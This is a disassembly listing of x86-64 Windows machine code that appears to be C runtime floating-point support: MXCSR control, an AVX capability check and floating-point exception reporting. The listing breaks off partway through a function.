   14000d22b:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000d230:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000d235:	41 8b f9             	mov    %r9d,%edi
   14000d238:	49 8b d8             	mov    %r8,%rbx
   14000d23b:	e8 08 06 00 00       	call   0x14000d848
   14000d240:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000d243:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000d248:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000d24d:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000d253:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000d258:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   14000d25e:	e8 e1 fe ff ff       	call   0x14000d144
   14000d263:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000d268:	85 c0                	test   %eax,%eax
   14000d26a:	75 40                	jne    0x14000d2ac
   14000d26c:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000d270:	75 11                	jne    0x14000d283
   14000d272:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000d275:	83 e0 e3             	and    $0xffffffe3,%eax
   14000d278:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000d27d:	83 c8 03             	or     $0x3,%eax
   14000d280:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000d283:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000d287:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000d28c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000d291:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000d296:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000d29a:	44 8b ce             	mov    %esi,%r9d
   14000d29d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000d2a2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d2a7:	e8 14 02 00 00       	call   0x14000d4c0
   14000d2ac:	e8 b3 80 ff ff       	call   0x140005364
   14000d2b1:	84 c0                	test   %al,%al
   14000d2b3:	74 34                	je     0x14000d2e9
   14000d2b5:	85 ff                	test   %edi,%edi
   14000d2b7:	74 30                	je     0x14000d2e9
   14000d2b9:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000d2be:	4d 8b c6             	mov    %r14,%r8
   14000d2c1:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000d2c7:	8b cf                	mov    %edi,%ecx
   14000d2c9:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000d2ce:	8b 55 67             	mov    0x67(%rbp),%edx
   14000d2d1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000d2d6:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000d2dc:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000d2e2:	e8 f5 fd ff ff       	call   0x14000d0dc
   14000d2e7:	eb 1c                	jmp    0x14000d305
   14000d2e9:	8b cf                	mov    %edi,%ecx
   14000d2eb:	e8 08 05 00 00       	call   0x14000d7f8
   14000d2f0:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000d2f5:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000d2fa:	e8 49 05 00 00       	call   0x14000d848
   14000d2ff:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000d305:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000d309:	48 33 cc             	xor    %rsp,%rcx
   14000d30c:	e8 7f 07 00 00       	call   0x14000da90
   14000d311:	0f 28 b4 24 d0 00 00 	movaps 0xd0(%rsp),%xmm6
   14000d318:	00 
   14000d319:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000d320:	41 5e                	pop    %r14
   14000d322:	5f                   	pop    %rdi
   14000d323:	5e                   	pop    %rsi
   14000d324:	5b                   	pop    %rbx
   14000d325:	5d                   	pop    %rbp
   14000d326:	c3                   	ret
   14000d327:	cc                   	int3
   14000d328:	cc                   	int3
   14000d329:	cc                   	int3
   14000d32a:	cc                   	int3
   14000d32b:	cc                   	int3
   14000d32c:	cc                   	int3
   14000d32d:	cc                   	int3
   14000d32e:	cc                   	int3
   14000d32f:	cc                   	int3
   14000d330:	40 53                	rex push %rbx
   14000d332:	48 83 ec 10          	sub    $0x10,%rsp
   14000d336:	45 33 c0             	xor    %r8d,%r8d
   14000d339:	33 c9                	xor    %ecx,%ecx
   14000d33b:	44 89 05 a6 d4 00 00 	mov    %r8d,0xd4a6(%rip)        # 0x14001a7e8
   14000d342:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000d346:	41 8b c1             	mov    %r9d,%eax
   14000d349:	0f a2                	cpuid
   14000d34b:	89 04 24             	mov    %eax,(%rsp)
   14000d34e:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000d353:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000d357:	23 c8                	and    %eax,%ecx
   14000d359:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000d35d:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000d361:	3b c8                	cmp    %eax,%ecx
   14000d363:	75 2c                	jne    0x14000d391
   14000d365:	33 c9                	xor    %ecx,%ecx
   14000d367:	0f 01 d0             	xgetbv
   14000d36a:	48 c1 e2 20          	shl    $0x20,%rdx
   14000d36e:	48 0b d0             	or     %rax,%rdx
   14000d371:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000d376:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000d37b:	44 8b 05 66 d4 00 00 	mov    0xd466(%rip),%r8d        # 0x14001a7e8
   14000d382:	24 06                	and    $0x6,%al
   14000d384:	3c 06                	cmp    $0x6,%al
   14000d386:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000d38a:	44 89 05 57 d4 00 00 	mov    %r8d,0xd457(%rip)        # 0x14001a7e8
   14000d391:	44 89 05 54 d4 00 00 	mov    %r8d,0xd454(%rip)        # 0x14001a7ec
   14000d398:	33 c0                	xor    %eax,%eax
   14000d39a:	48 83 c4 10          	add    $0x10,%rsp
   14000d39e:	5b                   	pop    %rbx
   14000d39f:	c3                   	ret
   14000d3a0:	48 83 ec 38          	sub    $0x38,%rsp
   14000d3a4:	48 8d 05 e5 93 00 00 	lea    0x93e5(%rip),%rax        # 0x140016790
   14000d3ab:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000d3b1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d3b6:	e8 05 00 00 00       	call   0x14000d3c0
   14000d3bb:	48 83 c4 38          	add    $0x38,%rsp
   14000d3bf:	c3                   	ret
   14000d3c0:	48 8b c4             	mov    %rsp,%rax
   14000d3c3:	48 83 ec 68          	sub    $0x68,%rsp
   14000d3c7:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000d3cb:	0f 28 f1             	movaps %xmm1,%xmm6
   14000d3ce:	41 8b d1             	mov    %r9d,%edx
   14000d3d1:	0f 28 d8             	movaps %xmm0,%xmm3
   14000d3d4:	41 83 e8 01          	sub    $0x1,%r8d
   14000d3d8:	74 2a                	je     0x14000d404
   14000d3da:	41 83 f8 01          	cmp    $0x1,%r8d
   14000d3de:	75 69                	jne    0x14000d449
   14000d3e0:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000d3e4:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000d3e7:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000d3ec:	45 8b c8             	mov    %r8d,%r9d
   14000d3ef:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000d3f4:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000d3fb:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000d402:	eb 2d                	jmp    0x14000d431
   14000d404:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000d40b:	00 
   14000d40c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000d40f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000d415:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000d41b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000d421:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000d428:	00 
   14000d429:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000d430:	00 
   14000d431:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000d438:	00 
   14000d439:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000d43f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000d444:	e8 b7 fd ff ff       	call   0x14000d200
   14000d449:	0f 28 c6             	movaps %xmm6,%xmm0
   14000d44c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000d451:	48 83 c4 68          	add    $0x68,%rsp
   14000d455:	c3                   	ret
   14000d456:	cc                   	int3
   14000d457:	cc                   	int3
   14000d458:	cc                   	int3
   14000d459:	cc                   	int3
   14000d45a:	cc                   	int3
   14000d45b:	cc                   	int3
   14000d45c:	cc                   	int3
   14000d45d:	cc                   	int3
   14000d45e:	cc                   	int3
   14000d45f:	cc                   	int3
   14000d460:	cc                   	int3
   14000d461:	cc                   	int3
   14000d462:	cc                   	int3
   14000d463:	cc                   	int3
   14000d464:	cc                   	int3
   14000d465:	cc                   	int3
   14000d466:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d46d:	00 00 00 
   14000d470:	48 83 ec 08          	sub    $0x8,%rsp
   14000d474:	0f ae 1c 24          	stmxcsr (%rsp)
   14000d478:	8b 04 24             	mov    (%rsp),%eax
   14000d47b:	48 83 c4 08          	add    $0x8,%rsp
   14000d47f:	c3                   	ret
   14000d480:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000d484:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000d489:	c3                   	ret
   14000d48a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000d48f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000d494:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000d498:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000d49d:	c3                   	ret
   14000d49e:	66 0f 2e 05 fa 92 00 	ucomisd 0x92fa(%rip),%xmm0        # 0x1400167a0
   14000d4a5:	00 
   14000d4a6:	73 14                	jae    0x14000d4bc
   14000d4a8:	66 0f 2e 05 f8 92 00 	ucomisd 0x92f8(%rip),%xmm0        # 0x1400167a8
   14000d4af:	00 
   14000d4b0:	76 0a                	jbe    0x14000d4bc
   14000d4b2:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000d4b7:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000d4bc:	c3                   	ret
   14000d4bd:	cc                   	int3
   14000d4be:	cc                   	int3
   14000d4bf:	cc                   	int3
   14000d4c0:	48 83 ec 48          	sub    $0x48,%rsp
   14000d4c4:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000d4c9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000d4ce:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000d4d3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000d4d8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d4dd:	e8 06 00 00 00       	call   0x14000d4e8
   14000d4e2:	48 83 c4 48          	add    $0x48,%rsp
   14000d4e6:	c3                   	ret
   14000d4e7:	cc                   	int3
   14000d4e8:	48 8b c4             	mov    %rsp,%rax
   14000d4eb:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000d4ef:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000d4f3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000d4f7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000d4fb:	55                   	push   %rbp
   14000d4fc:	48 8b ec             	mov    %rsp,%rbp
   14000d4ff:	48 83 ec 20          	sub    $0x20,%rsp
   14000d503:	48 8b da             	mov    %rdx,%rbx
   14000d506:	41 8b f1             	mov    %r9d,%esi
   14000d509:	33 d2                	xor    %edx,%edx
   14000d50b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000d510:	89 51 04             	mov    %edx,0x4(%rcx)
   14000d513:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d517:	89 50 08             	mov    %edx,0x8(%rax)
   14000d51a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d51e:	89 50 0c             	mov    %edx,0xc(%rax)
   14000d521:	41 f6 c0 10          	test   $0x10,%r8b
   14000d525:	74 0d                	je     0x14000d534
   14000d527:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d52b:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000d530:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000d534:	41 f6 c0 02          	test   $0x2,%r8b
   14000d538:	74 0d                	je     0x14000d547
   14000d53a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d53e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000d543:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000d547:	41 f6 c0 01          	test   $0x1,%r8b
   14000d54b:	74 0d                	je     0x14000d55a
   14000d54d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d551:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000d556:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000d55a:	41 f6 c0 04          	test   $0x4,%r8b
   14000d55e:	74 0d                	je     0x14000d56d
   14000d560:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d564:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000d569:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000d56d:	41 f6 c0 08          	test   $0x8,%r8b
   14000d571:	74 0d                	je     0x14000d580
   14000d573:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d577:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000d57c:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000d580:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d584:	48 8b 03             	mov    (%rbx),%rax
   14000d587:	48 c1 e8 07          	shr    $0x7,%rax
   14000d58b:	c1 e0 04             	shl    $0x4,%eax
   14000d58e:	f7 d0                	not    %eax
   14000d590:	33 41 08             	xor    0x8(%rcx),%eax
   14000d593:	83 e0 10             	and    $0x10,%eax
   14000d596:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d599:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d59d:	48 8b 03             	mov    (%rbx),%rax
   14000d5a0:	48 c1 e8 09          	shr    $0x9,%rax
   14000d5a4:	c1 e0 03             	shl    $0x3,%eax
   14000d5a7:	f7 d0                	not    %eax
   14000d5a9:	33 41 08             	xor    0x8(%rcx),%eax
   14000d5ac:	83 e0 08             	and    $0x8,%eax
   14000d5af:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d5b2:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d5b6:	48 8b 03             	mov    (%rbx),%rax
   14000d5b9:	48 c1 e8 0a          	shr    $0xa,%rax
   14000d5bd:	c1 e0 02             	shl    $0x2,%eax
   14000d5c0:	f7 d0                	not    %eax
   14000d5c2:	33 41 08             	xor    0x8(%rcx),%eax
   14000d5c5:	83 e0 04             	and    $0x4,%eax
   14000d5c8:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d5cb:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d5cf:	48 8b 03             	mov    (%rbx),%rax
   14000d5d2:	48 c1 e8 0b          	shr    $0xb,%rax
   14000d5d6:	03 c0                	add    %eax,%eax
   14000d5d8:	f7 d0                	not    %eax
   14000d5da:	33 41 08             	xor    0x8(%rcx),%eax
   14000d5dd:	83 e0 02             	and    $0x2,%eax
   14000d5e0:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d5e3:	8b 03                	mov    (%rbx),%eax
   14000d5e5:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d5e9:	48 c1 e8 0c          	shr    $0xc,%rax
   14000d5ed:	f7 d0                	not    %eax
   14000d5ef:	33 41 08             	xor    0x8(%rcx),%eax
   14000d5f2:	83 e0 01             	and    $0x1,%eax
   14000d5f5:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d5f8:	e8 e7 02 00 00       	call   0x14000d8e4
   14000d5fd:	48 8b d0             	mov    %rax,%rdx
   14000d600:	a8 01                	test   $0x1,%al
   14000d602:	74 08                	je     0x14000d60c
   14000d604:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d608:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000d60c:	f6 c2 04             	test   $0x4,%dl
   14000d60f:	74 08                	je     0x14000d619
   14000d611:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d615:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000d619:	f6 c2 08             	test   $0x8,%dl
   14000d61c:	74 08                	je     0x14000d626
   14000d61e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d622:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000d626:	f6 c2 10             	test   $0x10,%dl
   14000d629:	74 08                	je     0x14000d633
   14000d62b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d62f:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000d633:	f6 c2 20             	test   $0x20,%dl
   14000d636:	74 08                	je     0x14000d640
   14000d638:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d63c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000d640:	8b 03                	mov    (%rbx),%eax
   14000d642:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000d647:	48 23 c1             	and    %rcx,%rax
   14000d64a:	74 3e                	je     0x14000d68a
   14000d64c:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000d652:	74 26                	je     0x14000d67a
   14000d654:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000d65a:	74 0e                	je     0x14000d66a
   14000d65c:	48 3b c1             	cmp    %rcx,%rax
   14000d65f:	75 30                	jne    0x14000d691
   14000d661:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d665:	83 08 03             	orl    $0x3,(%rax)
   14000d668:	eb 27                	jmp    0x14000d691
   14000d66a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d66e:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000d671:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d675:	83 08 02             	orl    $0x2,(%rax)
   14000d678:	eb 17                	jmp    0x14000d691
   14000d67a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d67e:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000d681:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d685:	83 08 01             	orl    $0x1,(%rax)
   14000d688:	eb 07                	jmp    0x14000d691
   14000d68a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d68e:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000d691:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d695:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000d69b:	c1 e6 05             	shl    $0x5,%esi
   14000d69e:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000d6a4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6a8:	09 30                	or     %esi,(%rax)
   14000d6aa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6ae:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000d6b2:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000d6b6:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000d6ba:	74 33                	je     0x14000d6ef
   14000d6bc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6c0:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000d6c5:	21 50 20             	and    %edx,0x20(%rax)
   14000d6c8:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d6cc:	8b 08                	mov    (%rax),%ecx
   14000d6ce:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6d2:	89 48 10             	mov    %ecx,0x10(%rax)
   14000d6d5:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6d9:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000d6dd:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6e1:	21 50 60             	and    %edx,0x60(%rax)
   14000d6e4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d6e8:	8b 0e                	mov    (%rsi),%ecx
   14000d6ea:	89 48 50             	mov    %ecx,0x50(%rax)
   14000d6ed:	eb 48                	jmp    0x14000d737
   14000d6ef:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d6f3:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000d6f9:	8b 41 20             	mov    0x20(%rcx),%eax
   14000d6fc:	41 23 c0             	and    %r8d,%eax
   14000d6ff:	83 c8 02             	or     $0x2,%eax
   14000d702:	89 41 20             	mov    %eax,0x20(%rcx)
   14000d705:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d709:	48 8b 08             	mov    (%rax),%rcx
   14000d70c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d710:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000d714:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d718:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000d71c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000d720:	8b 42 60             	mov    0x60(%rdx),%eax
   14000d723:	41 23 c0             	and    %r8d,%eax
   14000d726:	83 c8 02             	or     $0x2,%eax
   14000d729:	89 42 60             	mov    %eax,0x60(%rdx)
   14000d72c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d730:	48 8b 16             	mov    (%rsi),%rdx
   14000d733:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000d737:	e8 ec 00 00 00       	call   0x14000d828
   14000d73c:	33 d2                	xor    %edx,%edx
   14000d73e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000d742:	8b cf                	mov    %edi,%ecx
   14000d744:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000d748:	ff 15 b2 19 00 00    	call   *0x19b2(%rip)        # 0x14000f100
   14000d74e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d752:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d755:	a8 10                	test   $0x10,%al
   14000d757:	74 08                	je     0x14000d761
   14000d759:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000d75e:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d761:	a8 08                	test   $0x8,%al
   14000d763:	74 08                	je     0x14000d76d
   14000d765:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000d76a:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d76d:	a8 04                	test   $0x4,%al
   14000d76f:	74 08                	je     0x14000d779
   14000d771:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000d776:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d779:	a8 02                	test   $0x2,%al
   14000d77b:	74 08                	je     0x14000d785
   14000d77d:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000d782:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d785:	a8 01                	test   $0x1,%al
   14000d787:	74 05                	je     0x14000d78e
   14000d789:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000d78e:	8b 01                	mov    (%rcx),%eax
   14000d790:	83 e0 03             	and    $0x3,%eax
   14000d793:	74 30                	je     0x14000d7c5
   14000d795:	83 e8 01             	sub    $0x1,%eax
   14000d798:	74 1f                	je     0x14000d7b9
   14000d79a:	83 e8 01             	sub    $0x1,%eax
   14000d79d:	74 0e                	je     0x14000d7ad
   14000d79f:	83 f8 01             	cmp    $0x1,%eax
   14000d7a2:	75 28                	jne    0x14000d7cc
   14000d7a4:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000d7ab:	eb 1f                	jmp    0x14000d7cc
   14000d7ad:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000d7b2:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000d7b7:	eb 13                	jmp    0x14000d7cc
   14000d7b9:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000d7be:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000d7c3:	eb 07                	jmp    0x14000d7cc
   14000d7c5:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000d7cc:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000d7d0:	74 07                	je     0x14000d7d9
   14000d7d2:	8b 41 50             	mov    0x50(%rcx),%eax
   14000d7d5:	89 06                	mov    %eax,(%rsi)
   14000d7d7:	eb 07                	jmp    0x14000d7e0
   14000d7d9:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000d7dd:	48 89 06             	mov    %rax,(%rsi)
   14000d7e0:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000d7e5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000d7ea:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000d7ef:	48 83 c4 20          	add    $0x20,%rsp
   14000d7f3:	5d                   	pop    %rbp
   14000d7f4:	c3                   	ret
   14000d7f5:	cc                   	int3
   14000d7f6:	cc                   	int3
   14000d7f7:	cc                   	int3
   14000d7f8:	48 83 ec 28          	sub    $0x28,%rsp
   14000d7fc:	83 f9 01             	cmp    $0x1,%ecx
   14000d7ff:	74 15                	je     0x14000d816
   14000d801:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000d804:	83 f8 01             	cmp    $0x1,%eax
   14000d807:	77 18                	ja     0x14000d821
   14000d809:	e8 46 9c ff ff       	call   0x140007454
   14000d80e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000d814:	eb 0b                	jmp    0x14000d821
   14000d816:	e8 39 9c ff ff       	call   0x140007454
   14000d81b:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000d821:	48 83 c4 28          	add    $0x28,%rsp
   14000d825:	c3                   	ret
   14000d826:	cc                   	int3
   14000d827:	cc                   	int3
   14000d828:	40 53                	rex push %rbx
   14000d82a:	48 83 ec 20          	sub    $0x20,%rsp
   14000d82e:	e8 3d fc ff ff       	call   0x14000d470
   14000d833:	8b d8                	mov    %eax,%ebx
   14000d835:	83 e3 3f             	and    $0x3f,%ebx
   14000d838:	e8 4d fc ff ff       	call   0x14000d48a
   14000d83d:	8b c3                	mov    %ebx,%eax
   14000d83f:	48 83 c4 20          	add    $0x20,%rsp
   14000d843:	5b                   	pop    %rbx
   14000d844:	c3                   	ret
   14000d845:	cc                   	int3
   14000d846:	cc                   	int3
   14000d847:	cc                   	int3
   14000d848:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000d84d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000d852:	57                   	push   %rdi
   14000d853:	48 83 ec 20          	sub    $0x20,%rsp
   14000d857:	48 8b da             	mov    %rdx,%rbx
   14000d85a:	48 8b f9             	mov    %rcx,%rdi
   14000d85d:	e8 0e fc ff ff       	call   0x14000d470
   14000d862:	8b f0                	mov    %eax,%esi
   14000d864:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000d868:	8b cb                	mov    %ebx,%ecx
   14000d86a:	f7 d1                	not    %ecx
   14000d86c:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000d872:	23 c8                	and    %eax,%ecx
   14000d874:	23 fb                	and    %ebx,%edi
   14000d876:	0b cf                	or     %edi,%ecx
   14000d878:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000d87c:	80 3d bd c1 00 00 00 	cmpb   $0x0,0xc1bd(%rip)        # 0x140019a40
   14000d883:	74 25                	je     0x14000d8aa
   14000d885:	f6 c1 40             	test   $0x40,%cl
   14000d888:	74 20                	je     0x14000d8aa
   14000d88a:	e8 f1 fb ff ff       	call   0x14000d480
   14000d88f:	eb 21                	jmp    0x14000d8b2
   14000d891:	c6 05 a8 c1 00 00 00 	movb   $0x0,0xc1a8(%rip)        # 0x140019a40
   14000d898:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000d89c:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000d89f:	e8 dc fb ff ff       	call   0x14000d480
   14000d8a4:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000d8a8:	eb 08                	jmp    0x14000d8b2
   14000d8aa:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000d8ad:	e8 ce fb ff ff       	call   0x14000d480
   14000d8b2:	8b c6                	mov    %esi,%eax
   14000d8b4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000d8b9:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000d8be:	48 83 c4 20          	add    $0x20,%rsp
   14000d8c2:	5f                   	pop    %rdi
   14000d8c3:	c3                   	ret
   14000d8c4:	40 53                	rex push %rbx
   14000d8c6:	48 83 ec 20          	sub    $0x20,%rsp
